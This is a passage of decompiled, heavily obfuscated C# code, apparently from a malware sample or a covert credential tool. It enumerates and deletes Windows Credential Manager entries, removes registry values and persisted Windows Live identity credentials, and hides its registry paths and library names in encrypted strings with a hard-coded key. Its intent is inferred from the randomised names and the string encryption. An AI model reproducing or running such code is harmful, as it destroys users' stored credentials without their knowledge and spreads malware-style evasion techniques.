		CredEnumerateW_1(lpszCredPattern, 0, ref pCount, ref lppCredentials);
		checked
		{
			if (pCount > 0)
			{
				int num = pCount - 1;
				JUDfbnB95WiK5oAFx6C23 jUDfbnB95WiK5oAFx6C = default(JUDfbnB95WiK5oAFx6C23);
				JUDfbnB95WiK5oAFx6C23 jUDfbnB95WiK5oAFx6C2 = default(JUDfbnB95WiK5oAFx6C23);
				for (int i = 0; i <= num; i++)
				{
					IntPtr ptr = Marshal.ReadIntPtr(lppCredentials, i * 4);
					object? obj = Marshal.PtrToStructure(ptr, jUDfbnB95WiK5oAFx6C.GetType());
					jUDfbnB95WiK5oAFx6C = ((obj != null) ? ((JUDfbnB95WiK5oAFx6C23)obj) : jUDfbnB95WiK5oAFx6C2);
					IntPtr ptr2 = new IntPtr(jUDfbnB95WiK5oAFx6C.lpstrTargetName);
					string lpwstrTargetName = OHBuKRZDAoSKHWSsmip81(ptr2);
					CredDeleteW(lpwstrTargetName, jUDfbnB95WiK5oAFx6C.dwType, jUDfbnB95WiK5oAFx6C.dwFlags);
				}
			}
			CredFree(lppCredentials);
		}
	}

	public void W5HO1QT21Qp7Ze2OM5X83(string szTargetName)
	{
		byte[] array = new byte[18]
		{
			38, 48, 111, 102, 81, 101, 56, 82, 98, 108,
			78, 100, 103, 110, 90, 83, 85, 74
		};
		IntPtr intPtr = Marshal.AllocHGlobal(38);
		int num = 0;
		checked
		{
			do
			{
				byte val = (byte)((short)(array[17 - num] ^ 0xC) + (17 - num));
				Marshal.WriteByte(intPtr, num * 2, val);
				num++;
			}
			while (num <= 17);
			Marshal.WriteInt16(intPtr, 36, 0);
			string lpSubKey = method_0("8DYu61PVOq2FZMLQdWt4I+/kGim2ul8u7e2zNVqcjYdxv9iEaJtD6g==", "12345#$%");
			int phkResult = default(int);
			int num2 = RegOpenKeyExA(-2147483647, ref lpSubKey, 0, 131078, ref phkResult);
			int lpcbData = 0;
			int hKey = phkResult;
			lpSubKey = method_0("5yqXvOobmBWjYQ+U9huFGToHAA8jKsNg0ZdYl78UxeI=", "12345#$%");
			int lpType = default(int);
			num2 = RegQueryValueExA_1(hKey, ref lpSubKey, 0, ref lpType, IntPtr.Zero, ref lpcbData);
			if (lpcbData > 0)
			{
				int hKey2 = phkResult;
				lpSubKey = method_0("5yqXvOobmBWjYQ+U9huFGToHAA8jKsNg0ZdYl78UxeI=", "12345#$%");
				num2 = RegDeleteValueA(hKey2, ref lpSubKey);
			}
			RegCloseKey(phkResult);
			lpSubKey = method_0("8DYu61PVOq2FZMLQdWt4I2soxcIHGyEfqCSEVbWZgNc=", "12345#$%");
			if (RegOpenKeyExA(-2147483647, ref lpSubKey, 0, 131097, ref phkResult) == 0)
			{
				lpcbData = 0;
				int hKey3 = phkResult;
				lpSubKey = method_0("5yqXvOobmBXf7FIWvrPp6xBpSVJvL4lBvoArca+IWcA=", "12345#$%");
				num2 = RegQueryValueExA_1(hKey3, ref lpSubKey, 0, ref lpType, IntPtr.Zero, ref lpcbData);
				if (lpcbData > 0)
				{
					int hKey4 = phkResult;
					lpSubKey = method_0("5yqXvOobmBXf7FIWvrPp6xBpSVJvL4lBvoArca+IWcA=", "12345#$%");
					num2 = RegDeleteValueA(hKey4, ref lpSubKey);
					return;
				}
			}
			RegCloseKey(phkResult);
			string lpLibFileName = QfITpgqVcDWoUMKPbRZ76() + method_0("EA4JV0Ui8748ZZ/DXx57K0cxtw3bP5LctlmBtdcr0ig=", "12345#$%");
			if (Operators.CompareString(FileSystem.Dir(lpLibFileName, (FileAttribute)0), (string)null, false) != 0)
			{
				int hLibModule = LoadLibraryA(ref lpLibFileName);
				GStruct1 guid = default(GStruct1);
				guid.Data4 = new byte[8];
				guid.Data1 = 1896408858;
				guid.Data2 = -26330;
				guid.Data3 = 20427;
				guid.Data4[0] = 188;
				guid.Data4[1] = 201;
				guid.Data4[2] = 154;
				guid.Data4[3] = 157;
				guid.Data4[4] = 63;
				guid.Data4[5] = 50;
				guid.Data4[6] = 228;
				guid.Data4[7] = 35;
				Initialize(ref guid, 1, 15);
				int lphExternalIdentity = default(int);
				if (Strings.Len(szTargetName) == 0)
				{
					int num3 = Information.UBound((Array)GTvgw5ELwwSGn0JwtJa8, 1);
					for (num = 0; num <= num3; num++)
					{
						int num4 = num;
						if (Strings.InStr(GTvgw5ELwwSGn0JwtJa8[num4].strTargetName, "ps:", (CompareMethod)0) == 1)
						{
							szTargetName = Strings.Mid(GTvgw5ELwwSGn0JwtJa8[num4].strTargetName, 4);
							if (CreateIdentityHandle(szTargetName, 255, ref lphExternalIdentity) == 0)
							{
								num2 = RemovePersistedCredential(lphExternalIdentity, method_0("2NGrkYDCHuyPKUaIHPbn/Q==", "12345#$%"));
								num2 = RemovePersistedCredential(lphExternalIdentity, method_0("7RxDBZUWSRpxLG9yAQLKbEv86LQWS19u", "12345#$%"));
								num2 = CloseIdentityHandle(lphExternalIdentity);
							}
						}
					}
				}
				else
				{
					szTargetName = Strings.Mid(szTargetName, 4);
					if (CreateIdentityHandle(szTargetName, 255, ref lphExternalIdentity) == 0)
					{
						num2 = RemovePersistedCredential(lphExternalIdentity, method_0("2NGrkYDCHuyPKUaIHPbn/Q==", "12345#$%"));
						num2 = RemovePersistedCredential(lphExternalIdentity, method_0("7RxDBZUWSRpxLG9yAQLKbEv86LQWS19u", "12345#$%"));
						num2 = CloseIdentityHandle(lphExternalIdentity);
					}
				}
				Uninitialize();
				FreeLibrary(hLibModule);
			}
			if (Strings.Len(szTargetName) == 0)
			{
				szTargetName = method_0("Tgwk53CSmXfcKjdaJc0r6Q==", "12345#$%");
				i9HWHrCeLNJNhzmxsu380(szTargetName);
				FgIJpixW3TwLVua6HHF82(intPtr);
			}
			else
			{
				num2 = CredDeleteW(szTargetName, 1, 0);
			}
			if (Strings.Len(szTargetName) == 0)
			{
				szTargetName = method_0("Tgwk53CSmXfcKjdaJc0r6Q==", "12345#$%");
				i9HWHrCeLNJNhzmxsu380(szTargetName);
				FgIJpixW3TwLVua6HHF82(intPtr);
			}
			else
			{
				num2 = CredDeleteW(szTargetName, 4, 0);
			}
			Marshal.FreeHGlobal(intPtr);
		}
	}

	private string bbdVVJ4DWfxQbKHmkXs84(ref string Base64String)
	{
		byte[] array = new byte[256];
		if (_0024STATIC_0024Base64Dec_0024201E10E_0024Enc.Length == 0)
		{
			_0024STATIC_0024Base64Dec_0024201E10E_0024Enc = Encoding.ASCII.GetBytes("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
		}
		int num = 0;
		checked
		{
			do
			{
				array[num] = 64;
				num++;
			}
			while (num <= 255);
			num = 0;
			do
			{
				array[_0024STATIC_0024Base64Dec_0024201E10E_0024Enc[num]] = (byte)num;
				num++;
			}
			while (num <= 63);
			int num2 = Strings.Len(Base64String);
			byte[] bytes = Encoding.ASCII.GetBytes(Base64String);
			byte[] array2 = (byte[])Utils.CopyArray((Array)array2, (Array)new byte[unchecked(num2 / 4) * 3 - 1 + 1]);
			int num3 = Information.UBound((Array)bytes, 1);
			int num4 = default(int);
			for (num = 0; num <= num3; num += 4)
			{
				array2[num4] = (byte)((unchecked((int)array[bytes[num]]) * 4) | unchecked((int)array[bytes[checked(num + 1)]] / 16));
				num4++;
				array2[num4] = (byte)(((short)(array[bytes[num + 1]] & 0xF) * 16) | unchecked((int)array[bytes[checked(num + 2)]] / 4));
				num4++;
				array2[num4] = (byte)(((short)(array[bytes[num + 2]] & 3) * 64) | array[bytes[num + 3]]);
				num4++;
			}
			num4 = ((bytes[num2 - 2] == 61) ? 2 : ((bytes[num2 - 1] == 61) ? 1 : 0));
			array2 = (byte[])Utils.CopyArray((Array)array2, (Array)new byte[Information.UBound((Array)array2, 1) - num4 + 1]);
			return Encoding.ASCII.GetString(array2);
		}
	}

	public IEnumerator GetEnumerator()
	{
		Reset();
		return this;
	}

	public void Reset()
	{
		ZlnIkYb5hJlsSinZdUo79();
		M4XcXMt0emhSIQkp4FV9 = 0;
	}

	public bool MoveNext()
	{
		if (GTvgw5ELwwSGn0JwtJa8 == null)
		{
			return false;
		}
		return M4XcXMt0emhSIQkp4FV9 < GTvgw5ELwwSGn0JwtJa8.Length;
	}
}
